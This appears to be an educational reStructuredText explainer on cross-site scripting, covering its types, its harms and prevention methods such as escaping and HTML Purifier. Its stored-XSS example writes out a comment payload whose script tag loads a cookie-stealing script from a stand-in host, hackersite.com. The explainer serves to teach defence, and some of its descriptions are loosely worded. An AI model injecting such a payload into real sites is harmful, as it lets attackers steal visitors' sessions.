Cross-Site Scripting
====================

Introduction
------------


Cross-site scripting is when an attacker inserts code into a legitimate website, 
and is considered one of the more dangerous website vulnerabilities. Web sites are 
vulnerable  when they don't use validation or encoding on user generated 
data. This is dangerous for the site users, who are at risk for their data being 
stolen. There are several different ways for web applications to help prevent 
Cross-Site Scripting, such as escaping characters, Signature based filtering, 
and avoiding/validating HTML given by users. Users can also take precautions, such 
as using anti-viruses, checking that the sites they are using are safe, and being 
careful of clicking on unknown links.  


What is Cross-site scripting and Why is it Dangerous?
-----------------------------------------------------


* XSS, or Cross-Site Scripting is inserting malicious code into an actual website 
  to gather information from the users. 

* Most danger lies on the users of the sites, as the code targets their information 
  and use rather than the website itself. [xss]_ 


* Some examples of what dangerous XSS could do include: 

	1. Access session cookies, which can be used to impersonate the user
	2. Keylogging, which tracks the users keystrokes to catch usernames and passwords
	3. Phishing, or sending out fake and/or malicious emails
	4. Installing malicious software or viruses on the user's computer
	5. and Identity Theft [xss]_
	
* There are two different types of XSS attacks, stored and reflective

* Stored xss is "stored", or imbedded, on the website itself and steals data every time 
  the website is visited. [xss-prevention]_ It is also known as "persistent XSS", 
  and can be the more dangerous of the two types. [xss-attacks]_

* Reflective xss is stored in a link embedded in the website that the user has to 
  click on to activate. [xss-attacks]_ 


What Can Be Done to Prevent XSS through Web Security
----------------------------------------------------
	
* Web Application Firewall (WAF) - most common protection [xss-attacks]_ 
	
* Signature based Filtering - "identifies and blocks malicious requests" [xss-attacks]_ 
	
* Use escape characters -  escape any characters that could change the websites code [xss-prevention]_ 
	
	* PHP Applications can use **htmlentities()** , a built in function for 
	  escaping characters 
	
	* Also escape any HTML, attribute, JavaScript, JSON (with HTML), CSS, and URL 
	  before entering any untrusted or un-validated data [xss_cheat_sheet]_
	
* Escape data output, not input - when displaying to user [xss-prevention]_ 

	* "Security researcher Jouko Pynn√∂nen of Klikki Oy realized MySQL column 
	  truncation can defeat before-insert XSS prevention strategies" [xss-prevention]_

* Avoid using straight HTML - use a markup language, such as Markdown or 
  ReStructuredText

* If HTML is needed, such as on blogging site, use a library such as HTML Purifier 
  to help validate the HTML [xss-prevention]_ 


What You Can Do To Spot/Prevent XSS
---------------------------

* Be careful of links that you click on in websites and through emails. 

* Make sure that websites that you are visiting are safe

* Have a good Anti-Virus/ Web Security, such as McAfee AntiVirus Plus, Bitdefender 
  AnitVirus Plus, or Kaspersky Anti-Virus

Example of Cross-Site Scripting:

	Stored XSS [xss-attacks]_ 

	
* Stored XSS Example: An attacker figures out that the comment section of a website can store 
  HTML tags. They leave a comment that says: 
  "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
  This is a stored in the website, and every time someone visits the page, they have their 
  session cookies stolen


	* Harder for hackers to attempt, because they must find a highly trafficked site that 
	  also has a security hole. [xss-prevention]_
	
	
* Reflective XSS: Similar to above, but the user would have to click on the link 
  to activate the code.
